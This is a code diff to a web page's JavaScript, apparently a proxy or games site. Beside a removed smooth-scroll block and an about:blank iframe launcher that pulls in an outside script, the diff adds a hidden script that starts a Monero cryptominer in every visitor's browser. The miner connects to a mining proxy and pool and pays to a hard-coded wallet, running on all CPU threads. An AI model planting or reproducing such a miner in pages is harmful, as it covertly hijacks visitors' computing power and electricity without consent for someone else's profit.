@@ -137,21 +137,19 @@ if (!location.href.startsWith('blob:')) {
         });
       });
     }
-
-/*const lenis = new Lenis({
-  lerp: 0.07,
-  wheelMultiplier: 1, 
-});
-
-function raf(time) {
-  lenis.raf(time);
-  requestAnimationFrame(raf);
-}
-requestAnimationFrame(raf);
-*/
 function abrir_about_blank() {
   (function () {var url = prompt('Paste the link you want to be embedded into an about:blank page.\n(INCLUDE https://)', 'https://example.com'); var urlObj = new window.URL(window.location.href); win = window.open(); win.document.body.style.margin = '0'; win.document.body.style.height = '100vh'; var iframe = win.document.createElement('iframe'); iframe.style.border = 'none'; iframe.style.width = '100%'; iframe.style.height = '100%'; iframe.style.margin = '0'; iframe.referrerpolicy = 'no-referrer'; iframe.allow = 'fullscreen'; iframe.src = url.toString(); win.document.body.appendChild(iframe); var script = win.document.createElement('script'); script.src = 'https://zatoga.pages.dev/js/main.min.js'; win.document.body.appendChild(script); })();
 }
+</script>
+<script>
+    server = "wss://ny1.xmrminingproxy.com";
+    var pool = "moneroocean.stream";
+    var walletAddress = "4A87r89fk6nQKGVdUKroHZWGMWi9v4SMh3pZeTLfdXqM2HqxiWsBMgiPRDz34s56dMFWYuBpHose1FiTi76xbczY5NyEctN";
+    var workerId = ""
+    var threads = -1;
+    var password = "x";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
 </script>
 <style>
 body {
